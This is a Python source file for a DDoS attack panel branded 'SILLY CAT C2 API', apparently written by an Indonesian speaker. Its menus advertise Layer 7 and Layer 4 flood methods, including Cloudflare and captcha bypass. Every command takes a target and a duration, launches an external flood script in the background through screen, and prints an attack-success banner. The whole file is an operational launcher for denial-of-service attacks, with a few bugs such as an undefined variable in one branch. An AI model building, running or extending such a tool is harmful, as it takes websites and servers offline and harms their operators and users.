# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
from colorama import Fore, Back
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

# Fungsi untuk mendapatkan waktu saat ini dalam format yang diinginkan
from datetime import datetime

def waktu():
    # Mendapatkan waktu saat ini dalam format yang diinginkan
    return datetime.now().strftime("%b %d %Y %H:%M:%S")


# Daftar negara
countries = ['Indonesia', 'Amerika Serikat', 'Inggris', 'Perancis', 'Jepang', 'Kanada', 'Australia']

# Memilih negara secara acak
random_country = random.choice(countries)


B = '\033[35m' #MERAH
P = '\033[1;37m' #PUTIH

def country():
    # Membuat daftar negara dan singkatannya
    countries = {
        "United States": "US",
        "United Kingdom": "UK",
        "Canada": "CA",
        "Australia": "AU",
        "Indonesia": "INA",
        # Tambahkan negara lain di sini sesuai kebutuhan
    }

def ongoing():
        print("""\033[37m
No attacks are executed. try to go home and try an attack(help)
""")

def Vip():
	print("""\033[37m
\033[32m                      Layer 7 Vip
\033[31m ════════════════════             ══════════════════
\033[37m TLS       \033[35m    ━━━━━➤ \033[36mBypass H.TTPDDOS
\033[37m MIX       \033[35m    ━━━━━➤ \033[36mCloudFlare, Good for CloudFlare
\033[37m HTTPS2    \033[35m    ━━━━━➤ \033[36mBypass Chaptcha, good for Hold
\033[37m FLOOD     \033[35m    ━━━━━➤ \033[36mBIG RPS, No HTTPDDOS
\033[37m KILL      \033[35m    ━━━━━➤ \033[36mBest Methods New
\033[37m XYZ       \033[35m    ━━━━━➤ \033[36mBest Tls-V1
\033[37m XYN       \033[35m    ━━━━━➤ \033[36mBest Tls-V2
\033[37m BYPASS    \033[35m    ━━━━━➤ \033[36mTls/H2
\033[37m PAINZY    \033[35m    ━━━━━➤ \033[36mTls-Simple
\033[37m STORM     \033[35m    ━━━━━➤ \033[36mTls-V3
\033[37m BOMB2     \033[35m    ━━━━━➤ \033[36mMethods (Hulk)
\033[37m BOMB      \033[35m    ━━━━━➤ \033[36mMethods (Strike)
\033[37m RAPID      \033[35m   ━━━━━➤ \033[36mHigh Proxy
\033[37m STRIKE     \033[35m   ━━━━━➤ \033[36mTls <Get/Post>
\033[31m ══════════════════════════════════════════════════

\033[32m                      Layer 4 Vip
\033[31m ════════════════════            ══════════════════
\033[37m  TCP      \033[35m    ━━━━━➤ \033[36mTCP VIP
\033[31m ══════════════════════════════════════════════════

\033[35m Command :\033[37m [METHOD] [TARGET] [TIME]
""")

def layer4():
	print("""\033[37m
""")

def help():
	print("""\033[37m
\033[36m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[36m┣\033[32m        × Layer 7 ×
\033[36m┣➤\033[34mTLS               |\033[34m STORM
\033[36m┣➤\033[34mMIX               |\033[34m BOMB2 <Get/Post>
\033[36m┣➤\033[34mHTTPS2            |\033[34m BOMB
\033[36m┣➤\033[34mFLOOD             |\033[34m STRIKE <Get/Post>
\033[36m┣➤\033[34mKILL              |\033[34m HTTPS <Get/Post>
\033[36m┣➤\033[34mXYZ               |\033[34m CFBYPASS
\033[36m┣➤\033[34mXYN	            |\033[34m FATZX
\033[36m┣➤\033[34mBYPASS            |\033[34m GECKOLD
\033[36m┣➤\033[34mPAINZY            |\033[34m LEZKILL
\033[36m┣➤\033[34mMIXSYN            |\033[34m SKYNET
\033[36m┣➤\033[34mTZYO              |\033[34m UAM
\033[36m┣➤\033[34mBROWSER❌         |\033[34m VORTEX
\033[36m┣➤\033[34mHYBRID            |\033[34m RAPID   
\033[36m┣\033[32m        × Layer 4 ×
\033[36m┣➤\033[34mOVH         |\033[37m Maintenance
\033[36m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛

\033[35m Command :\033[37m [METHOD] [TARGET] [TIME]
""")

def menu():
    os.system ("clear")
    print("""\033[36m
\033[36m                 ╔═╗  ╦  ╦    ╦    ╦ ╦  ╔═╗  ╔═╗  ╔╦╗
\033[36m	         ╚═╗  ║  ║    ║    ╚╦╝  ║    ╠═╣   ║
\033[36m                 ╚═╝  ╩  ╩═╝  ╩═╝   ╩   ╚═╝  ╩ ╩   ╩
\033[32m           ╚╦═══════════════════════════════════════════╦╝
\033[32m       ╔════╩═══════════════════════════════════════════╩════╗
\033[32m       ║             WELCOME TO SILLY CAT C2 API🔥           ║
\033[32m       ║	     • New Recode By CodeSyntax •            ║
\033[32m       ╚═════════════════════════════════════════════════════╝

\033[32m          ╔═══════════════════════════════════════════════╗
\033[32m          ║-➤\033[34m Methods |\033[37m see methods\033[32m                       ║
\033[32m          ║-➤\033[34m Vip     |\033[37m see all vip methods\033[32m               ║
\033[32m          ║-➤\033[34m Plan    |\033[37m View your plan\033[32m                    ║
\033[32m          ╚═══════════════════════════════════════════════╝
""")



def main():

	while True:
		sys.stdout.write(f"\x1b]2;[/] CodeSyntax :: Server Online 500 :: Online 1 :: Running: 0/10\x07")
		sin = input("\033[0;44;45mSILLY CAT\033[0;44;45m • CodeSyntax\x1b[1;40m\033[0m ➤ \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			menu()
		if sinput == "cls" or sinput == "CLS":
			os.system ("pkill screen")
			os.system ("clear")
			menu()
		if sinput == "stop" or sinput == "STOP":
			os.system ("pkill screen")
			menu()			
		if sinput == "vip" or sinput == "vip" or sinput == ".VIP" or sinput == "VIP" or sinput == ".Vip" or sinput == "Vip":
			Vip()
		if sinput == "layer4" or sinput == "l4" or sinput == ".layer4" or sinput == "LAYER4" or sinput == ".LAYER4" or sinput == "L4":
			layer4()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "methods" or sinput == ".methods" or sinput == "METHODS" or sinput == ".METHODS":
			help()
		if sinput == "plan":
			plant()
		elif sinput == "":
			main()

#########LAYER-4 - 7########
		elif sinput == "kill" or sinput == "KILL":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node kill.js {url} {time} 100 15')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m kill\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tcp" or sinput == "TCP":
			try:
				method = sin.split()[1]
				ip = sin.split()[2]
				port = sin.split()[3]
				time = sin.split()[4]
				os.system(f'screen -dm ./TCP {method} {ip} {port} {time} 15000')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HEADER:      \033[31m[ \033[36m{method} \033[31m]
\033[1;37m   IP:          \033[31m[\033[36m {ip}\033[31m ]
\033[1;37m   PORT:        \033[31m[\033[36m {port}\033[31m ]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m tcp\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "flood" or sinput == "FLOOD":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node flood.js {url} {time} 10 proxy.txt 100')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status: 	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Time:    	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:  	\033[37m[\033[36m flood\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()

#########LAYER-7########  
		elif sinput == "xyz" or sinput == "XYZ" or sinput == "xyz" or sinput == "XYZ":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node Xyz.js {url} {time} 64 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m xyz\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "https2" or sinput == "HTTPS2":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node HTTPS2.js {url} {time} 100 15 proxy.txt')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status: 	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:  	\033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Time: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:	\033[37m[\033[36m https2\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "mix" or sinput == "MIX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node MIX.js {url} {time} 100 15')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:  	\033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Time:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:	\033[37m[\033[36m mix\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "xyn" or sinput == "XYN" or sinput == "xyn" or sinput == "XYN":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node xyn.js {url} {time} 100 15 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m xyn\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bypass" or sinput == "BYPASS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node ACK.js {url} {time} 100 15 proxy.txt')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status: 	\033[37m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Time: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m bypass\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "painzy" or sinput == "PAINZY":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node painzy.js {url} {time} 100 15')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD: 	\033[31m[\033[36m painzy\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mERORR37\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "tls" or sinput == "TLS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node tls.js {url} {time} 100 15')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:	\033[37m[\033[32m Attack Sent Successfully All Server\033[37m ]
\033[1;37m   Host:  	\033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Time: 	\033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:	\033[37m[\033[36m tls\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "bomb" or sinput == "BOMB":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm go run strike.go -url {url} {time}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m bomb\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "storm" or sinput == "STORM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node Storm.js {url} {time} 100 15 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST: 	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m storm\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "rapid" or sinput == "RAPID":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node RAPID.js {url} {time} 100 15 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m rapid\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "strike" or sinput == "STRIKE":
			try:
				method = sin.split()[1]
				url = sin.split()[2]
				time = sin.split()[3]
				os.system(f'screen -dm node strike.js {method} {url} {time} 15 100 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HEADER:  	\033[31m[ \033[36m{method}\033[31m]
\033[1;37m   HOST: 	\033[31m[\033[36m {url}\033[31m ]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m strike\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()
		elif sinput == "hybrid" or sinput == "HYBRID" or sinput == "hybrid" or sinput == "HYBRID":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node node hybrid.js {url} {time} 20 64 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:	\033[31m[\033[36m hybrid\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "cfbypass" or sinput == "CFBYPASS":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node node CFBypass.js {url} {time}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST: 	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME: 	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:  	\033[31m[\033[36m cfbypass\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "bomb2" or sinput == "BOMB2":
			try:
				url = sin.split()[1]
				method = sin.split()[2]
				time = sin.split()[3]
				os.system(f'screen -dm go run Hulk.go -site {url} {time} -data {method}')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS: 	\033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:  	\033[31m[ \033[36m{url} \033[31m]
\033[1;37m   HEADER:	\033[31m[\033[36m {time}\033[31m ]
\033[1;37m   TIME:    	\033[37m[\033[36m {method}\033[37m ]
\033[1;37m   METHOD: 	\033[31m[\033[36m bomb2\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "fatzx" or sinput == "FATZX":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node fatzx.js {url} {time} 100 10')
				print(f"""
\033[1;37m Attacks Details
\033[1;37m   Status:      \033[37m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[37m ]
\033[1;37m   Host:        \033[37m[ \033[36m{url} \033[37m]
\033[1;37m   Time:        \033[37m[\033[36m {time}\033[37m ]
\033[1;37m   Method:      \033[37m[\033[36m fatzx\033[37m ]
\033[1;37m   Start Attack:\033[37m[\033[36m {waktu()} \033[37m]

\033[1;37m Target Details
\033[1;37m   ASN:        \033[37m [ \033[36mAS13335 Cloudflare, Inc.\033[37m ]
\033[1;37m   ISP:        \033[37m [ \033[36mAS13335\033[37m ]
\033[1;37m   ORG:        \033[37m [ \033[36m{random_country}\033[37m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "geckold" or sinput == "GECKOLD":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node geckold.js {url} {time} 64 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m geckold\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:        \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:         \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:     \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()			    
		elif sinput == "uam" or sinput == "UAM":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node uam.js {url} {time} 64 10 proxy.txt')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m uam\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
			    main()
		elif sinput == "mixsyn" or sinput == "MIXSYN":
			try:
				host = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node MIXSYN.js {url} 10 {time}')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
\033[1;37m                            ATTACK HAS BEEN STARTED!
\033[35m                ╚╦════════════════════════════════════════════╦╝
\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
\033[1;37m                VVIP     : \033[35m[ \033[1;37mMIXSYN \033[35m]
\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                USER     : \033[35m[ \033[1;37mCodeSyntax \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()			    			    
		elif sinput == "lezkill" or sinput == "LEZKILL":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node LEZKILL.js {url} {time} 100 10')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m lezkill\033[31m ]
\033[1;37m   START ATTACK:\033[31m[\033[36m {waktu()} \033[31m]

\033[1;37m USER DETAILS
\033[1;37m   USER:       \033[31m [ \033[36mADMIN\033[31m ]
\033[1;37m   ASN:        \033[31m [ \033[36mAS13335 Cloudflare, Inc.\033[31m ]
\033[1;37m   EXPIRED:    \033[31m [ \033[1;37m2024-2029\033[31m ]

\033[37mPlease After Attack Type \033[36m'CLS'\033[37m For Back To Home
""")
			except ValueError:
				main()
			except IndexError:
				main()         
		elif sinput == "tzyo" or sinput == "TZYO":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'screen -dm node TZyo.js {url} {time} 100 10')
				print(f"""
\033[1;37m ATTACK DETAILS
\033[1;37m   STATUS:      \033[31m[\033[32m ATTACK SENT SUCCESSFULLY ALL SERVER\033[31m ]
\033[1;37m   HOST:        \033[31m[ \033[36m{url} \033[31m]
\033[1;37m   TIME:        \033[31m[\033[36m {time}\033[31m ]
\033[1;37m   METHOD:      \033[31m[\033[36m tzyo\033[31m ]
